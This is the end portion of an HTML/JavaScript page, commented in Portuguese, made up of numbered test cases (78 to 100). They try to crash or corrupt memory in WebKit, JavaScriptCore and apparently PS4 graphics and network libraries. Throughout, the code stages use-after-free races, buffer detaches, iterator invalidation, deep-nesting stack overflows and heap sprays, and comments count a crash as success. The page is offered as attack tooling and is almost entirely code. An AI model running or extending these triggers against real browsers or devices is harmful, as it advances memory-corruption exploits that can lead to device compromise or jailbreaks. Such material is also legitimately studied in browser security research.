        const data = new Uint8Array(1024 * 1024 * 10); // 10MB
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        // Inicia Digest (SHA-256)
        crypto.subtle.digest("SHA-256", data).then(() => {
            log.innerText = "Digest completou (Race failed).";
        }).catch(e => {
            log.innerText = "Digest falhou: " + e.message;
        });
        
        // AÇÃO: Race Condition - Detach Buffer
        try {
            worker.postMessage(data.buffer, [data.buffer]);
            
            if (data.byteLength === 0) {
                log.innerText = "Buffer transferido durante Crypto Digest.";
            }
        } catch(e) {}
        
        keeper.push(new Uint32Array(100000));
    }

    // =================================================================
    // 78. Shadow Slot Assignment Race
    // Alvo: WebCore::ShadowRoot / HTMLSlotElement
    // Vulnerabilidade: Render Tree Corruption.
    // Lógica: Slots distribuem elementos do Light DOM para o Shadow DOM.
    // Forçamos uma atualização de distribuição (`assignedNodes`) e removemos
    // a Shadow Root inteira durante o processo.
    // =================================================================
    function t78() {
        const host = document.createElement('div');
        document.body.appendChild(host);
        
        const shadow = host.attachShadow({mode: 'open'});
        const slot = document.createElement('slot');
        shadow.appendChild(slot);
        
        const child = document.createElement('span');
        child.innerText = "SLOTTED";
        host.appendChild(child); // Vai para o slot
        
        // Observer para pegar o momento da distribuição
        const observer = new MutationObserver(() => {
            // AÇÃO: Destruição da Shadow Root
            // WebKit não tem API para remover shadow root, mas podemos remover o host
            // e tentar manipular os nós órfãos
            host.remove();
            
            // Acessa propriedade que força recálculo de layout nos nós soltos
            const h = child.offsetHeight;
            
            keeper.push(new Float64Array(1000));
            log.innerText = "Host removido durante distribuição de Slot.";
        });
        
        observer.observe(slot, { attributes: true }); // Tenta observar mudanças internas
        
        // Trigger
        slot.name = "new-name";
        setTimeout(() => slot.name = "", 0);
    }

    // =================================================================
    // 79. CSS Counter Style UAF
    // Alvo: WebCore::CSSCounterStyleRule
    // Vulnerabilidade: UAF no CSSOM.
    // Lógica: `@counter-style` define marcadores de lista customizados.
    // Aplicamos esse estilo a uma lista. Via JS, deletamos a regra do stylesheet.
    // Forçamos um repaint imediato. O renderizador pode tentar desenhar o marcador usando a regra deletada.
    // =================================================================
    function t79() {
        const style = document.createElement('style');
        style.textContent = `
            @counter-style crash-counter {
                system: cyclic;
                symbols: "A" "B" "C";
                suffix: " ";
            }
            ul { list-style: crash-counter; }
        `;
        document.head.appendChild(style);
        
        const list = document.createElement('ul');
        list.innerHTML = "<li>Item 1</li><li>Item 2</li>";
        document.body.appendChild(list);
        
        // Força layout inicial
        list.offsetHeight;
        
        // AÇÃO: Remove a regra @counter-style
        setTimeout(() => {
            const sheet = style.sheet;
            // Assume que é a regra 0
            try {
                sheet.deleteRule(0);
                
                // Força repaint imediato acessando geometria
                list.style.display = 'none';
                list.offsetHeight;
                list.style.display = 'block';
                list.offsetHeight;
                
                keeper.push(new ArrayBuffer(1024 * 100)); // Preenche memória
                
                log.innerText = "Counter Style deletado com lista ativa.";
            } catch(e) {
                log.innerText = "Erro: " + e.message;
            }
        }, 10);
    }

    // =================================================================
    // 80. URLSearchParams Iterator Invalidation
    // Alvo: WebCore::URLSearchParams
    // Vulnerabilidade: C++ Iterator Invalidation.
    // Lógica: Iteramos sobre os parâmetros de busca. Dentro do loop,
    // deletamos a chave atual. Iteradores C++ ingênuos podem crashar ao tentar
    // avançar para o "próximo" elemento a partir de um elemento deletado.
    // =================================================================
    function t80() {
        const params = new URLSearchParams("a=1&b=2&c=3&d=4");
        
        try {
            // Itera usando o iterador nativo
            for (const [key, value] of params) {
                if (key === 'b') {
                    // AÇÃO: Modificação da coleção durante iteração
                    params.delete('b'); // Deleta o atual
                    params.delete('c'); // Deleta o próximo
                    
                    // Adiciona novos para realocar memória interna
                    params.append('e', '5'.repeat(1000));
                }
            }
            log.innerText = "Iteração completou (Iterator seguro).";
        } catch(e) {
            log.innerText = "Erro ou Crash: " + e.message;
        }
        
        keeper.push(new Uint32Array(5000));
    }
// =================================================================
    // 81. Selection.addRange vs DOMNodeRemoved
    // Alvo: WebCore::Selection (Layout Engine)
    // Vulnerabilidade: UAF via Mutation Event.
    // Lógica: Mutation Events (como DOMNodeRemoved) são legados e perigosos.
    // Tentamos selecionar um texto. Quando o navegador vai destacar esse texto,
    // o evento dispara e removemos o nó que está sendo processado.
    // =================================================================
    function t81() {
        const container = document.createElement('div');
        container.innerHTML = "<b>SELECAO</b><i>PERIGOSA</i>";
        document.body.appendChild(container);

        const range = document.createRange();
        range.selectNode(container.firstChild); // Seleciona <b>

        // Armadilha: Mutation Event
        container.addEventListener('DOMNodeRemoved', () => {
            // AÇÃO: O motor de seleção está tentando ler o nó
            // Nós removemos o resto do conteúdo e forçamos layout
            container.innerHTML = "";
            
            // Spray para corromper o RenderObject
            keeper.push(new Uint32Array(5000));
            
            log.innerText = "Nó removido durante cálculo de Seleção.";
        });

        try {
            const sel = window.getSelection();
            sel.removeAllRanges();
            // Ao adicionar o range, o navegador dispara eventos internos e pinta a seleção
            sel.addRange(range);
            
            // Trigger manual da remoção se o addRange não disparar sozinho
            container.firstChild.remove();
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 82. putImageData ArrayBuffer Detach
    // Alvo: libSceGnm (GPU Upload)
    // Vulnerabilidade: UAF / Buffer Underflow.
    // Lógica: `putImageData` copia pixels da memória JS para a textura da GPU.
    // Usamos um Worker para "detach" (esvaziar) o Uint8ClampedArray que segura os pixels
    // no momento exato em que a API gráfica está lendo.
    // =================================================================
    function t82() {
        const c = document.createElement('canvas');
        c.width = 1000; c.height = 1000;
        const ctx = c.getContext('2d');
        
        // Buffer de pixels (4MB)
        const buffer = new ArrayBuffer(1000 * 1000 * 4);
        const data = new Uint8ClampedArray(buffer);
        // Preenche com ruído
        data.fill(255);
        
        const imgData = new ImageData(data, 1000, 1000);
        
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        // Race Condition
        try {
            // Agenda o detach para ocorrer "durante" a cópia para GPU
            // (Difícil sincronizar em JS puro, mas tentamos via microtask ou postMessage imediato)
            worker.postMessage(buffer, [buffer]);
            
            // Chama a API pesada
            ctx.putImageData(imgData, 0, 0);
            
            if (buffer.byteLength === 0) {
                log.innerText = "Buffer esvaziado. putImageData sobreviveu?";
            }
        } catch(e) {
            // Se der erro de "detached buffer", o browser verificou corretamente.
            // Se crashar, sucesso.
            log.innerText = "Browser bloqueou: " + e.message;
        }
    }

    // =================================================================
    // 83. Deeply Nested HTML Injection
    // Alvo: WebCore::HTMLParser (Recursão C++)
    // Vulnerabilidade: Stack Overflow / Memory Corruption.
    // Lógica: Injetamos uma string HTML com milhares de tags aninhadas.
    // O parser recursivo do WebKit pode estourar a pilha (Stack Exhaustion).
    // Em alguns casos, o tratamento de erro da pilha cheia corrompe o estado do parser.
    // =================================================================
    function t83() {
        // Gera string: <div><div><div>...</div></div></div>
        const depth = 5000; 
        let html = "";
        for(let i=0; i<depth; i++) html += "<div>";
        for(let i=0; i<depth; i++) html += "</div>";
        
        const container = document.createElement('div');
        
        log.innerText = "Injetando HTML profundidade " + depth + "...";
        
        // AÇÃO: O parser síncrono roda aqui
        // Se a aba fechar instantaneamente, é um Stack Overflow.
        setTimeout(() => {
            container.innerHTML = html;
            log.innerText = "Parser sobreviveu.";
        }, 100);
    }

    // =================================================================
    // 84. window.find() vs Element Removal
    // Alvo: WebCore::Find (Search Engine)
    // Vulnerabilidade: UAF durante travessia de texto.
    // Lógica: `window.find()` procura texto na página. Enquanto ele destaca o resultado,
    // ele pode disparar eventos de scroll ou foco. Usamos esses eventos para
    // destruir o elemento onde o texto foi encontrado.
    // =================================================================
    function t84() {
        const div = document.createElement('div');
        div.innerText = "ALVO_DA_BUSCA";
        div.id = "alvo";
        document.body.appendChild(div);
        
        // Garante que não está selecionado
        window.getSelection().removeAllRanges();
        
        // Observer para detectar mudanças de foco/seleção causadas pelo find()
        // (Ou usamos timeout para race cega)
        setTimeout(() => {
            // AÇÃO: Busca síncrona
            const found = window.find("ALVO_DA_BUSCA");
            
            if (found) {
                // Se encontrou, o WebKit criou um Range interno.
                // Removemos o nó agora.
                div.remove();
                
                // Tenta buscar de novo (Find Next) com o ponteiro anterior inválido
                try {
                    window.find("ALVO_DA_BUSCA"); 
                } catch(e) {}
                
                keeper.push(new Uint32Array(1000));
                log.innerText = "Elemento encontrado removido entre buscas.";
            }
        }, 100);
    }

    // =================================================================
    // 85. Map Delete during Iteration
    // Alvo: JavaScriptCore (Map Iterator)
    // Vulnerabilidade: Iterator Invalidation (C++).
    // Lógica: Iteramos sobre um Map nativo. Dentro do loop, deletamos a chave atual
    // e adicionamos novas chaves para forçar o rehash (realocação da tabela interna).
    // Se o iterador C++ não atualizar seus ponteiros após o rehash, crash.
    // =================================================================
    function t85() {
        const map = new Map();
        for(let i=0; i<100; i++) map.set(i, "val");
        
        try {
            for (const [key, value] of map) {
                if (key === 10) {
                    // AÇÃO: Deleta chaves massivamente
                    map.clear();
                    
                    // Adiciona chaves novas para disparar rehash/resize do backing store
                    for(let j=0; j<200; j++) map.set("new"+j, j);
                    
                    // O loop 'for..of' tenta continuar para a chave 11
                    // Mas a tabela hash mudou completamente
                    log.innerText = "Map limpo e redimensionado durante iteração.";
                }
            }
        } catch(e) {
            log.innerText = "Erro (Seguro): " + e.message;
        }
    }
// =================================================================
    // 86. Canvas Gradient AddStop vs Reset
    // Alvo: WebCore::CanvasGradient (Graphics Context)
    // Vulnerabilidade: UAF em Recurso Gráfico.
    // Lógica: Criamos um gradiente. Enquanto adicionamos paradas de cor (color stops),
    // resetamos o canvas (width=0). O objeto gradiente está atrelado ao contexto.
    // Se o contexto for limpo, o gradiente pode perder sua referência de backing store.
    // =================================================================
    function t86() {
        const c = document.createElement('canvas');
        const ctx = c.getContext('2d');
        
        // Cria gradiente
        const g = ctx.createLinearGradient(0, 0, 100, 100);
        
        // Loop de race
        const interval = setInterval(() => {
            try {
                // AÇÃO 1: Adiciona cor (aloca memória na GPU/Driver)
                g.addColorStop(Math.random(), 'red');
                
                // AÇÃO 2: Reseta canvas (tenta limpar recursos do contexto)
                c.width = 100; 
                
                // Uso
                ctx.fillStyle = g;
                ctx.fillRect(0,0,10,10);
            } catch(e) {
                // Ignore erros de estado inválido
            }
        }, 0);
        
        // Para depois de um tempo
        setTimeout(() => {
            clearInterval(interval);
            keeper.push(new Uint32Array(1024*10)); // Spray
            log.innerText = "Canvas Gradient Race finalizado.";
        }, 200);
    }

    // =================================================================
    // 87. WebAssembly Memory Grow View Detach
    // Alvo: JavaScriptCore (Wasm Engine)
    // Vulnerabilidade: Out-of-Bounds Read/Write (UAF).
    // Lógica: Wasm Memory é um buffer redimensionável. Criamos uma TypedArray (view) sobre ele.
    // Chamamos `memory.grow()`. O motor DEVE desanexar (neuter) a view antiga e alocar uma nova.
    // Se falhar, a view antiga aponta para memória liberada.
    // =================================================================
    function t87() {
        if (!window.WebAssembly) {
            log.innerText = "WebAssembly não suportado.";
            return;
        }

        try {
            // 1 página inicial (64KB)
            const memory = new WebAssembly.Memory({initial: 1});
            
            // View apontando para a memória atual
            const view = new Uint8Array(memory.buffer);
            view[0] = 42;
            
            // AÇÃO: Cresce a memória (Realloc)
            // Isso move o buffer base para outro endereço
            memory.grow(1); 
            
            // Verifica se a view antiga foi invalidada (buffer detached)
            // Se view.length > 0, temos um UAF (View apontando para memória antiga)
            if (view.length > 0) {
                log.innerText = "CRITICAL: Wasm View não foi desanexada após grow!";
                // Tenta ler/escrever na memória antiga
                view[0] = 0x41;
            } else {
                log.innerText = "Wasm Engine seguro (View detached).";
            }
            
            keeper.push(memory);
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 88. Select Options Length Truncate
    // Alvo: WebCore::HTMLOptionsCollection
    // Vulnerabilidade: UAF no DOM.
    // Lógica: `<select>` tem uma coleção de `<option>`.
    // Acessamos um option específico enquanto definimos `length = 0`.
    // O motor C++ deve garantir que o objeto option retornado continue vivo
    // mesmo sendo removido da árvore.
    // =================================================================
    function t88() {
        const select = document.createElement('select');
        for(let i=0; i<100; i++) {
            const opt = document.createElement('option');
            opt.text = "opt" + i;
            select.add(opt);
        }
        
        // Define um getter malicioso em Object.prototype (se afetar índices)
        // ou usa um acesso direto.
        
        try {
            // Acessa o elemento 50
            const target = select.options[50];
            
            // AÇÃO: Trunca a coleção imediatamente
            select.options.length = 0;
            
            // Tenta acessar propriedades do objeto que acabou de ser removido
            // Se o garbage collector rodar agora, 'target' deve proteger o objeto C++
            const txt = target.text;
            
            // Força GC
            keeper.push(new ArrayBuffer(1024 * 1024));
            
            log.innerText = "Options Collection truncada. Acesso: " + txt;
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 89. DOMMatrix.fromMatrix Getter Mutation
    // Alvo: WebCore::DOMMatrix
    // Vulnerabilidade: Type Confusion / Memory Corruption.
    // Lógica: `DOMMatrix.fromMatrix(obj)` converte um objeto JS em Matriz C++.
    // Ele lê propriedades x, y, z... Definimos getters que alteram o estado global
    // ou consomem muita memória durante a leitura.
    // =================================================================
    function t89() {
        if (!window.DOMMatrix) {
            log.innerText = "DOMMatrix não suportado.";
            return;
        }

        const evil = {
            a: 1,
            b: 2,
            get c() {
                // AÇÃO: Side-effect massivo
                // Tenta forçar GC ou alocação
                keeper.push(new Float64Array(10000));
                log.innerText = "Side-effect dentro da Matriz.";
                return 3;
            },
            d: 4, e: 5, f: 6
        };

        try {
            // O construtor C++ itera sobre as propriedades
            const m = DOMMatrix.fromMatrix(evil);
            keeper.push(m);
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 90. Worker importScripts() vs Terminate
    // Alvo: WebKit::NetworkDataTaskCurl (Load síncrono)
    // Vulnerabilidade: UAF no Network Loader do Worker.
    // Lógica: `importScripts` bloqueia o Worker até o download terminar.
    // Iniciamos o download e matamos o Worker da thread principal.
    // O callback de rede (`curlDidComplete`) pode tentar acordar um Worker morto.
    // =================================================================
    function t90() {
        // Script lento ou grande
        const scriptUrl = window.location.href + "?delay=1000&rnd=" + Math.random();
        
        const blob = new Blob([`
            try {
                importScripts('${scriptUrl}');
            } catch(e) {}
        `], {type: 'text/javascript'});
        
        const worker = new Worker(URL.createObjectURL(blob));
        
        // AÇÃO: Mata o worker logo após o início (tentando acertar o tempo de rede)
        setTimeout(() => {
            worker.terminate();
            
            // Spray para preencher a memória do contexto do Worker
            keeper.push(new Uint32Array(1024 * 1024));
            
            log.innerText = "Worker terminado durante importScripts (Sync Network).";
        }, 10);
    }
 // =================================================================
    // 91. WebGL DrawBuffers vs Texture Delete
    // Alvo: libSceGnm (Driver GPU) / WEBGL_draw_buffers
    // Vulnerabilidade: UAF em Anexo de Framebuffer.
    // Lógica: Usamos a extensão para desenhar em múltiplas texturas simultaneamente.
    // Deletamos uma das texturas alvo logo antes do comando de desenho.
    // O driver pode tentar escrever pixel data em uma superfície liberada.
    // =================================================================
    function t91() {
        const c = document.createElement('canvas');
        const gl = c.getContext('webgl');
        const ext = gl.getExtension('WEBGL_draw_buffers');
        
        if (!ext) {
            log.innerText = "Extensão DrawBuffers não suportada.";
            return;
        }

        const fb = gl.createFramebuffer();
        gl.bindFramebuffer(gl.FRAMEBUFFER, fb);
        
        const tex = gl.createTexture();
        gl.bindTexture(gl.TEXTURE_2D, tex);
        gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 100, 100, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
        
        // Anexa textura
        gl.framebufferTexture2D(gl.FRAMEBUFFER, ext.COLOR_ATTACHMENT0_WEBGL, gl.TEXTURE_2D, tex, 0);
        ext.drawBuffersWEBGL([ext.COLOR_ATTACHMENT0_WEBGL]);
        
        // AÇÃO: Deleta textura vs Draw
        gl.deleteTexture(tex);
        
        try {
            // Tenta desenhar no framebuffer que tem um anexo morto
            gl.drawArrays(gl.TRIANGLES, 0, 3);
            log.innerText = "Draw chamado com textura anexada deletada.";
        } catch(e) {}
        
        keeper.push(new Uint32Array(1024 * 1024));
    }

    // =================================================================
    // 92. FileReader onprogress vs Blob Neuter
    // Alvo: WebCore::FileReader
    // Vulnerabilidade: UAF / Logic Error.
    // Lógica: `readAsArrayBuffer` dispara eventos `progress`.
    // Dentro do evento, usamos um Worker para transferir (neuter) o buffer
    // que compõe o Blob original. O FileReader tenta continuar lendo de um buffer vazio.
    // =================================================================
    function t92() {
        const buffer = new Uint8Array(1024 * 1024 * 10); // 10MB
        const blob = new Blob([buffer]);
        const reader = new FileReader();
        
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        reader.onprogress = (e) => {
            if (e.loaded > 0) {
                // AÇÃO: Transfere o buffer original para o worker
                // Isso esvazia a fonte de dados do Blob
                try {
                    worker.postMessage(buffer.buffer, [buffer.buffer]);
                    log.innerText = "Buffer fonte transferido durante leitura.";
                } catch(err) {}
                
                // Spray para ocupar memória
                keeper.push(new ArrayBuffer(1024 * 1024));
            }
        };
        
        reader.readAsArrayBuffer(blob);
    }

    // =================================================================
    // 93. FontFaceSet.ready vs Iframe Kill
    // Alvo: WebCore::CSSFontSelector
    // Vulnerabilidade: UAF no Documento.
    // Lógica: `document.fonts.ready` retorna uma Promise.
    // Removemos o documento (iframe) antes da Promise resolver.
    // Quando a Promise resolve (Microtask), ela tenta acessar o contexto de fonte do documento morto.
    // =================================================================
    function t93() {
        const ifr = document.createElement('iframe');
        document.body.appendChild(ifr);
        
        const doc = ifr.contentDocument;
        
        // Cria carga de fonte pendente
        const face = new FontFace("Slow", "url(data:font/woff;base64,AAA...)");
        doc.fonts.add(face);
        face.load().catch(()=>{});
        
        // Aguarda ready
        doc.fonts.ready.then(() => {
            // Callback roda após destruição
            log.innerText = "Promise resolved. Acessando doc morto...";
            const s = doc.fonts.status; // Acesso perigoso
        });
        
        // AÇÃO: Destruição imediata
        setTimeout(() => {
            ifr.remove();
            
            // Força GC massivo
            keeper.push(new Float64Array(10000));
            log.innerText = "Iframe removido com Font Promise pendente.";
        }, 0);
    }

    // =================================================================
    // 94. IDBTransaction vs DeleteDatabase
    // Alvo: WebCore::IDBTransaction
    // Vulnerabilidade: Use-After-Free Lógico.
    // Lógica: Iniciamos uma transação. Deletamos o banco de dados.
    // Tentamos usar a transação (put/get) em um banco que está marcado para deleção.
    // =================================================================
    function t94() {
        const req = indexedDB.open("RaceDB_94", 1);
        
        req.onupgradeneeded = () => {
            req.result.createObjectStore("store");
        };
        
        req.onsuccess = () => {
            const db = req.result;
            const tx = db.transaction("store", "readwrite");
            const store = tx.objectStore("store");
            
            // AÇÃO: Deleta o banco enquanto temos uma transação ativa
            db.close();
            const del = indexedDB.deleteDatabase("RaceDB_94");
            
            del.onsuccess = () => {
                try {
                    // Tenta usar a transação órfã
                    store.put("data", "key");
                    log.innerText = "Escrita tentada em DB deletado.";
                } catch(e) {
                    log.innerText = "Erro: " + e.message;
                }
            };
            
            keeper.push(new ArrayBuffer(1024 * 1024));
        };
    }

    // =================================================================
    // 95. WebSocket Huge Send vs Close
    // Alvo: WebKit::NetworkSocketStream / libSceNet
    // Vulnerabilidade: Heap Overflow no Buffer de Rede.
    // Lógica: WebSockets têm um buffer de saída interno.
    // Enviamos um buffer gigante (maior que o MTU e buffer interno).
    // Fechamos o socket imediatamente. O kernel tenta limpar o buffer de envio,
    // mas a thread de envio pode estar tentando ler do buffer JS que pode ser coletado.
    // =================================================================
    function t95() {
        // Echo server ou dummy local (o alvo é o cliente, não o servidor)
        const ws = new WebSocket("wss://echo.websocket.org");
        
        ws.onopen = () => {
            // Cria payload gigante (50MB)
            const huge = new Uint8Array(1024 * 1024 * 50).fill(0x41);
            
            // AÇÃO: Envia e Fecha no mesmo tick
            try {
                ws.send(huge);
                ws.close(); // Força limpeza de buffers
                
                // Spray para ocupar o heap caso o buffer do socket seja liberado
                keeper.push(new Uint32Array(1024 * 1024 * 10));
                
                log.innerText = "WebSocket Send 50MB + Close executado.";
            } catch(e) {
                log.innerText = "Erro: " + e.message;
            }
        };
        
        ws.onerror = () => log.innerText = "WS Error (Normal se offline).";
    }
// =================================================================
    // 96. XSLT Fragment Adopt vs Destroy
    // Alvo: WebCore::XSLTProcessor (libxml2 wrapper)
    // Vulnerabilidade: UAF na Adoção de Nós.
    // Lógica: Geramos um DocumentFragment via XSLT.
    // Tentamos adotar (`adoptNode`) um nó desse fragmento para o documento principal,
    // mas destruímos a referência ao fragmento original simultaneamente.
    // =================================================================
    function t96() {
        const xml = new DOMParser().parseFromString("<r><a>test</a></r>", "text/xml");
        const xsl = new DOMParser().parseFromString(`
            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                <output>
                    <target>DATA</target>
                </output>
            </xsl:template>
            </xsl:stylesheet>
        `, "text/xml");

        const processor = new XSLTProcessor();
        processor.importStylesheet(xsl);
        
        // Gera o fragmento
        let fragment = processor.transformToFragment(xml, document);
        const targetNode = fragment.querySelector("target");
        
        // AÇÃO: Adoção vs Destruição
        // Tentamos mover o nó para o doc principal
        try {
            // Remove a referência forte ao fragmento pai
            fragment = null;
            
            // Força GC para tentar limpar o fragmento órfão
            keeper.push(new ArrayBuffer(1024 * 1024));
            
            // Adota o nó (que pode estar apontando para memória liberada do fragmento)
            document.body.appendChild(document.adoptNode(targetNode));
            
            log.innerText = "Nó XSLT adotado após liberação do fragmento.";
        } catch(e) {
            log.innerText = "Erro: " + e.message;
        }
    }

    // =================================================================
    // 97. Path2D addPath(self) Recursion
    // Alvo: WebCore::Path2D (Graphics)
    // Vulnerabilidade: Stack Overflow / Memory Corruption.
    // Lógica: `Path2D` permite adicionar outros caminhos.
    // Se adicionarmos um caminho a ele mesmo (`p.addPath(p)`), criamos uma definição recursiva.
    // Quando o Canvas tenta rasterizar isso, ele pode entrar em loop infinito ou crashar.
    // =================================================================
    function t97() {
        if (!window.Path2D) {
            log.innerText = "Path2D não suportado.";
            return;
        }

        const p = new Path2D();
        p.rect(0, 0, 100, 100);
        
        try {
            // AÇÃO: Auto-referência
            // Alguns browsers bloqueiam, outros crasham o driver gráfico
            p.addPath(p);
            
            // Tenta desenhar o caminho impossível
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            ctx.fill(p);
            
            log.innerText = "Path2D recursivo desenhado (Driver sobreviveu).";
        } catch(e) {
            // RangeError é o esperado (bloqueio de recursão)
            log.innerText = "Browser detectou recursão: " + e.message;
        }
    }

    // =================================================================
    // 98. HTMLElement.dataset Rope Flattening
    // Alvo: JavaScriptCore String Heap
    // Vulnerabilidade: Heap Corruption.
    // Lógica: Atributos `data-*` são acessíveis via `dataset`.
    // Criamos uma String Rope (concatenada, lazy). Atribuímos ao dataset.
    // Lemos de volta forçando "flattening" (linearização) enquanto pressionamos a memória.
    // =================================================================
    function t98() {
        const div = document.createElement('div');
        
        // Cria Rope gigante
        let s = "Rope";
        for(let i=0; i<18; i++) s += s; // ~256KB
        
        // Atribui ao dataset (DOMStringMap)
        div.dataset.test = s;
        
        // AÇÃO: Trigger Flattening
        // O acesso via dataset força a conversão JSString -> StringImpl
        // Tentamos fazer isso enquanto alocamos lixo para mover o heap
        const trigger = {
            toString: () => {
                keeper.push(new Uint8Array(1024 * 1024));
                return "";
            }
        };
        
        // Replace força leitura e modificação
        const res = div.dataset.test.replace(/Rope/, trigger);
        
        log.innerText = "Dataset Rope Flattening executado.";
    }

    // =================================================================
    // 99. CSS calc() Deep Nesting vs Layout
    // Alvo: WebCore::CSSParser / StyleResolver
    // Vulnerabilidade: Stack Overflow / Logic Error.
    // Lógica: `calc()` pode ser aninhado. Criamos uma string CSS com 
    // `calc(1px + calc(1px + ...))` milhares de vezes.
    // Aplicamos ao elemento e forçamos o cálculo de layout.
    // =================================================================
    function t99() {
        let depth = 2000;
        let css = "1px";
        
        // Constrói string aninhada
        for(let i=0; i<depth; i++) {
            css = `calc(1px + ${css})`;
        }
        
        const div = document.createElement('div');
        document.body.appendChild(div);
        
        try {
            log.innerText = "Aplicando CSS calc() profundidade " + depth + "...";
            div.style.width = css;
            
            // Força o motor de estilo a resolver a expressão
            const width = getComputedStyle(div).width;
            
            log.innerText = "Cálculo CSS completou: " + width;
        } catch(e) {
            log.innerText = "Erro no CSS Parser: " + e.message;
        }
    }

    // =================================================================
    // 100. Blob Triangulation Race (The Century Test)
    // Alvo: WebKit::NetworkDataTaskCurl / BlobRegistry
    // Vulnerabilidade: Complex UAF.
    // Lógica: Envolve 3 atores competindo pelo mesmo recurso (BlobData):
    // 1. XHR Upload (Lê o Blob)
    // 2. Worker PostMessage (Transfere/Neuter o Blob)
    // 3. URL Revoke (Deleta o registro do Blob)
    // O objetivo é fazer o cURL ler memória inválida.
    // =================================================================
    function t100() {
        // 1. Cria Blob
        const data = new Uint8Array(1024 * 1024 * 5).fill(0xCC);
        const blob = new Blob([data]);
        const url = URL.createObjectURL(blob);
        
        // 2. Prepara Worker
        const worker = new Worker(URL.createObjectURL(new Blob([""], {type: 'text/javascript'})));
        
        // 3. Prepara XHR Upload
        const xhr = new XMLHttpRequest();
        xhr.open("POST", "/null");
        
        xhr.upload.onprogress = (e) => {
            if (e.loaded > 0) {
                // AÇÃO CRÍTICA: Dispara as armas
                
                // Arma 1: Transfere o buffer fonte para o Worker (Neuter)
                try { worker.postMessage(data.buffer, [data.buffer]); } catch(e){}
                
                // Arma 2: Revoga a URL pública
                URL.revokeObjectURL(url);
                
                // Arma 3: Sobrescreve a memória local
                keeper.push(new Uint32Array(1024 * 1024 * 5).fill(0xDEADBEEF));
                
                // Aborta o XHR para criar caos no cleanup
                xhr.abort();
                
                log.innerText = "TRIANGULATION RACE EXECUTADA.";
            }
        };
        
        // Envia
        const formData = new FormData();
        formData.append("file", blob);
        xhr.send(formData);
    }


</script>
</body>
</html>
